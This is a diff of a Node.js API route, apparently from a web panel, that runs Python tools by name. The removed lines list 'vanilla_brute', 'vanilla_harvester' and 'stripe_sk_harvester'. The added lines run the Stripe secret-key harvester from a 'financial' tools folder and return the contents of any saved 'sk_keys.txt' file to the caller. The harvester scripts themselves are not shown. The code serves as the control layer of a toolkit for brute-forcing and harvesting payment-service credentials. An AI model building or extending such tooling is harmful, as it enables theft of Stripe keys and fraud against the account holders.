@@ -1,51 +1,51 @@
-import { exec } from 'child_process';
-import fs from 'fs';
+const { exec } = require('child_process');
+const path = require('path');
+const fs = require('fs');
 
 export default function handler(req, res) {
   if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Method not allowed' });
+    return res.status(405).json({ success: false, error: 'Method not allowed' });
   }
 
   const { toolName } = req.body;
 
-  const scriptFiles = {
-    'vanilla_brute': 'vanilla_brute.py',
-    'vanilla_harvester': 'vanilla_harvester.py',
-    'stripe_sk_harvester': 'stripe_sk_harvester.py'
+  // Map tool names to physical script file paths
+  const toolPaths = {
+    'stripe_sk_harvester': '/app/tools/financial/stripe_sk_harvester.py',
+    // Add other tool path mappings here as needed
   };
 
-  const fileName = scriptFiles[toolName];
-  
-  if (!fileName) {
+  const scriptPath = toolPaths[toolName];
+  if (!scriptPath) {
     return res.status(400).json({ success: false, error: 'Invalid tool selected.' });
   }
 
-  // Dynamically search the entire container filesystem for the script file
-  exec(`find / -name "${fileName}" 2>/dev/null`, (findErr, stdout) => {
-    const foundPaths = stdout.trim().split('\n').filter(Boolean);
-    const targetScript = foundPaths[0];
+  exec(`python3 "${scriptPath}"`, (error, stdout, stderr) => {
+    let savedKeysContent = '';
+    
+    // Automatically look for sk_keys.txt in the current directory or tool directory
+    const possibleKeyPaths = [
+      path.join(process.cwd(), 'sk_keys.txt'),
+      path.join('/app/tools/financial', 'sk_keys.txt'),
+      path.join(__dirname, 'sk_keys.txt')
+    ];
 
-    if (!targetScript || !fs.existsSync(targetScript)) {
-      return res.status(404).json({ 
-        success: false, 
-        error: `Could not find '${fileName}' anywhere in the container. Check if a .dockerignore file is excluding your tools/ folder.` 
-      });
+    for (const p of possibleKeyPaths) {
+      if (fs.existsSync(p)) {
+        try {
+          savedKeysContent = fs.readFileSync(p, 'utf8');
+          break;
+        } catch (e) {
+          // ignore read errors and try next
+        }
+      }
     }
 
-    // Execute the dynamically located script using python3
-    exec(`python3 "${targetScript}"`, (execErr, stdoutExec, stderrExec) => {
-      if (execErr) {
-        return res.status(500).json({ 
-          success: false, 
-          error: execErr.message, 
-          stderr: stderrExec 
-        });
-      }
-
-      return res.status(200).json({ 
-        success: true, 
-        output: stdoutExec || stderrExec 
-      });
+    res.json({
+      success: !error,
+      output: stdout,
+      stderr: stderr,
+      savedKeys: savedKeysContent
     });
   });
 }
